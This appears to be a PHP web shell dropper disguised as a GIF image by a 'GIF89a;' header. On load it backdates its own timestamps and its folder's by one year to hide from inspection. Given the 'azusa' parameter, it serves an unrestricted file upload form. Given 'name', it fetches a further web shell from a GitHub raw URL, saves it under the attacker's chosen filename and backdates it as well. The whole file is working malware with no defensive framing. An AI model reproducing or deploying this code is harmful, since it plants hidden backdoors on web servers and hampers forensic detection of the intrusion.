GIF89a;
<?PhP

// create function to change mtime and atime from a file

function change_file_time($file, $time)
{
    // check if $file exists
    if (file_exists($file)) {
        // change file mtime and atime
        if (touch($file, $time, $time)) {
            echo "Success change file time<br>";
        } else {
            echo "Failed change file time<br>";
        }
    } else {
        echo "File $file not found<br>";
    }
}

// $file is this file path and name example: /home/user/public_html/ek.php
$file = __FILE__;
// change this file mtime and atime to 1 year ago
if (touch($file, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
    echo "Success change file time<br>";
} else {
    echo "Failed change file time<br>";
}
// $dir is this file directory example: /home/user/public_html/
$dir = dirname(__FILE__);
// change this file directory mtime and atime to 1 year ago
if (touch($dir, time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
    echo "Success change file time<br>";
} else {
    echo "Failed change file time<br>";
}
// display file mtime and atime
echo "File mtime: " . date("Y-m-d H:i:s", filemtime($file)) . "<br>";

if (isset($_GET['azusa'])) {
    if ($_POST) {
        if (@copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
            echo "<b>berhasil</b>-->" . $_FILES["f"]["name"] . "<br>";
        } else {
            echo "<b>gagal";
        }
    } else {
        echo "<form method=post enctype=multipart/form-data>
	<input type=file name=f>
	<input name=v type=submit id=v value=up><br>";
    }
} else {
    if (isset($_GET['name'])) {
        $fileName = $_GET['name'];
        if (!file_exists($_GET['name'])) {
            // create file $_GET['name']
            if (touch($_GET['name'], time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
                $content = file_get_contents("https://raw.githubusercontent.com/azusa-sama/Webshell/master/x.php");
                // if success put content to file $_GET['name'] then echo success
                if (file_put_contents($_GET['name'], $content)) {
                    echo "Success create file<br>";
                    // change file mtime and atime to 1 year ago
                    if (touch($_GET['name'], time() - 3600 * 24 * 365, time() - 3600 * 24 * 365)) {
                        echo "Success change file time<br>";
                    } else {
                        echo "Failed change file time<br>";
                    }
                    // show link to file $_GET['name']
                    echo "File Link : <a href='$fileName'>$fileName</a><br>";
                } else {
                    echo "Failed create file<br>";
                }
            } else {
                echo "Failed create file<br>";
            }
        } else {
            echo "File $fileName already exists<br>";
            // echo $fileName mtime and atime
            echo "<a href='$fileName'>$fileName</a> mtime: " . date("Y-m-d H:i:s", filemtime($fileName)) . "<br>";
        }
    }
}
